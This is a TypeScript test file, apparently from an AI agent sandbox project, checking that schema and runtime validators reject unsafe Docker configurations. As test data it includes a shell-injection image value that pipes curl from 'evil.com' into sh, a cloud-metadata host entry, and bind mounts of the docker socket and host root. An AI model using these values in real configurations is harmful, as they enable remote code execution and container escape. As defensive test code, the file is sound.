/**
 * Cross-layer security integration tests.
 *
 * These tests verify that the two independent security validation layers
 * (Zod schema validation at config parse time, and runtime validation
 * at container creation time) agree on what is safe and unsafe.
 *
 * Flow: Config JSON → SandboxDockerSchema (Zod) → resolveSandboxDockerConfig()
 *       → buildSandboxCreateArgs() → validateSandboxSecurity() → docker create
 */
import { describe, expect, it, vi } from "vitest";

const { validateConfigObject } = await vi.importActual<typeof import("./config.js")>("./config.js");

import type { SandboxDockerConfig } from "../agents/sandbox/types.docker.js";
import { resolveSandboxDockerConfig } from "../agents/sandbox/config.js";
import { buildSandboxCreateArgs } from "../agents/sandbox/docker.js";
import { validateSandboxSecurity } from "../agents/sandbox/validate-sandbox-security.js";

/** Minimal valid config that passes both layers. */
function createSafeDockerConfig(overrides?: Partial<SandboxDockerConfig>): SandboxDockerConfig {
  return {
    image: "debian:bookworm-slim",
    containerPrefix: "openclaw-test-",
    workdir: "/workspace",
    readOnlyRoot: true,
    tmpfs: ["/tmp", "/var/tmp", "/run"],
    network: "none",
    capDrop: ["ALL"],
    ...overrides,
  };
}

describe("cross-layer security integration", () => {
  // ═══════════════════════════════════════════════════════════════════════
  // Happy path — both layers agree a safe config is valid
  // ═══════════════════════════════════════════════════════════════════════

  describe("end-to-end: safe config produces secure docker args", () => {
    it("minimal config passes schema and runtime validation", () => {
      // Layer 1: Zod schema validation
      const schemaRes = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: {
                image: "debian:bookworm-slim",
                tmpfs: ["/tmp"],
              },
            },
          },
        },
      });
      expect(schemaRes.ok).toBe(true);

      // Layer 2: Runtime resolve + validation
      const resolved = resolveSandboxDockerConfig({
        scope: "agent",
        globalDocker: { image: "debian:bookworm-slim", tmpfs: ["/tmp"] },
      });
      expect(() => validateSandboxSecurity(resolved)).not.toThrow();

      // Layer 3: Build args
      const args = buildSandboxCreateArgs({
        name: "test-sandbox",
        cfg: resolved,
        scopeKey: "test-session",
      });

      // Verify security-critical flags are present
      expect(args).toContain("--read-only");
      expect(args).toContain("--security-opt");
      expect(args.indexOf("no-new-privileges")).toBeGreaterThan(0);
      expect(args).toContain("--cap-drop");
      expect(args[args.indexOf("--cap-drop") + 1]).toBe("ALL");
      expect(args).toContain("--network");
      expect(args[args.indexOf("--network") + 1]).toBe("none");
    });

    it("config with all security fields produces complete args", () => {
      const cfg = createSafeDockerConfig({
        user: "1000:1000",
        dns: ["8.8.8.8"],
        extraHosts: ["myhost:192.168.1.1"],
        pidsLimit: 256,
        memory: "512m",
      });

      expect(() => validateSandboxSecurity(cfg)).not.toThrow();

      const args = buildSandboxCreateArgs({
        name: "test-full",
        cfg,
        scopeKey: "test-session",
      });

      expect(args).toContain("--user");
      expect(args[args.indexOf("--user") + 1]).toBe("1000:1000");
      expect(args).toContain("--dns");
      expect(args[args.indexOf("--dns") + 1]).toBe("8.8.8.8");
      expect(args).toContain("--add-host");
      expect(args[args.indexOf("--add-host") + 1]).toBe("myhost:192.168.1.1");
      expect(args).toContain("--pids-limit");
      expect(args).toContain("--memory");
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Schema catches it — Runtime never sees it
  // ═══════════════════════════════════════════════════════════════════════

  describe("schema-layer rejections (config parse time)", () => {
    it("rejects tmpfs with exec option before runtime", () => {
      const schemaRes = validateConfigObject({
        agents: {
          defaults: {
            sandbox: { docker: { tmpfs: ["/tmp:exec,size=256m"] } },
          },
        },
      });
      expect(schemaRes.ok).toBe(false);
    });

    it("rejects user=root before runtime", () => {
      const schemaRes = validateConfigObject({
        agents: {
          defaults: {
            sandbox: { docker: { user: "root" } },
          },
        },
      });
      expect(schemaRes.ok).toBe(false);
    });

    it("rejects extraHosts with cloud metadata IP before runtime", () => {
      const schemaRes = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["metadata:169.254.169.254"] },
            },
          },
        },
      });
      expect(schemaRes.ok).toBe(false);
    });

    it("rejects dns with hostname before runtime", () => {
      const schemaRes = validateConfigObject({
        agents: {
          defaults: {
            sandbox: { docker: { dns: ["evil.dns.server"] } },
          },
        },
      });
      expect(schemaRes.ok).toBe(false);
    });

    it("rejects docker image with shell injection before runtime", () => {
      const schemaRes = validateConfigObject({
        agents: {
          defaults: {
            sandbox: { docker: { image: "; curl evil.com | sh" } },
          },
        },
      });
      expect(schemaRes.ok).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Runtime catches it — Schema allows it (defense in depth)
  // ═══════════════════════════════════════════════════════════════════════

  describe("runtime-layer rejections (container creation time)", () => {
    it("runtime blocks bind mount targeting /etc", () => {
      const cfg = createSafeDockerConfig({
        binds: ["/etc:/host-etc:ro"],
      });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/blocked path/);
    });

    it("runtime blocks bind mount targeting /proc", () => {
      const cfg = createSafeDockerConfig({
        binds: ["/proc:/host-proc"],
      });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/blocked path/);
    });

    it("runtime blocks bind mount targeting docker socket", () => {
      const cfg = createSafeDockerConfig({
        binds: ["/var/run/docker.sock:/var/run/docker.sock"],
      });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/blocked path/);
    });

    it("runtime blocks bind mount of root /", () => {
      const cfg = createSafeDockerConfig({
        binds: ["/:/host-root"],
      });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/blocked path|covers/);
    });

    it("runtime blocks network mode 'host'", () => {
      const cfg = createSafeDockerConfig({ network: "host" });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/host/);
    });

    it("runtime blocks seccomp 'unconfined'", () => {
      const cfg = createSafeDockerConfig({ seccompProfile: "unconfined" });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/unconfined/);
    });

    it("runtime blocks apparmor 'unconfined'", () => {
      const cfg = createSafeDockerConfig({ apparmorProfile: "unconfined" });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/unconfined/);
    });

    it("runtime blocks relative bind mounts", () => {
      const cfg = createSafeDockerConfig({
        binds: ["./relative:/workspace"],
      });
      expect(() => validateSandboxSecurity(cfg)).toThrow(/non-absolute/);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Defaults verification — resolveSandboxDockerConfig applies safe defaults
  // ═══════════════════════════════════════════════════════════════════════

  describe("default config is secure", () => {
    it("defaults include capDrop ALL, read-only root, network none", () => {
      const resolved = resolveSandboxDockerConfig({ scope: "agent" });

      expect(resolved.capDrop).toEqual(["ALL"]);
      expect(resolved.readOnlyRoot).toBe(true);
      expect(resolved.network).toBe("none");
      expect(resolved.tmpfs).toEqual(["/tmp", "/var/tmp", "/run"]);
    });

    it("default config passes runtime validation", () => {
      const resolved = resolveSandboxDockerConfig({ scope: "agent" });
      expect(() => validateSandboxSecurity(resolved)).not.toThrow();
    });

    it("default config produces args with security flags", () => {
      const resolved = resolveSandboxDockerConfig({ scope: "agent" });
      const args = buildSandboxCreateArgs({
        name: "default-test",
        cfg: resolved,
        scopeKey: "test",
      });

      // Must contain no-new-privileges
      const noPriIdx = args.indexOf("no-new-privileges");
      expect(noPriIdx).toBeGreaterThan(0);
      expect(args[noPriIdx - 1]).toBe("--security-opt");

      // Must contain --read-only
      expect(args).toContain("--read-only");

      // Must contain --cap-drop ALL
      const capIdx = args.indexOf("--cap-drop");
      expect(capIdx).toBeGreaterThan(0);
      expect(args[capIdx + 1]).toBe("ALL");
    });
  });
});
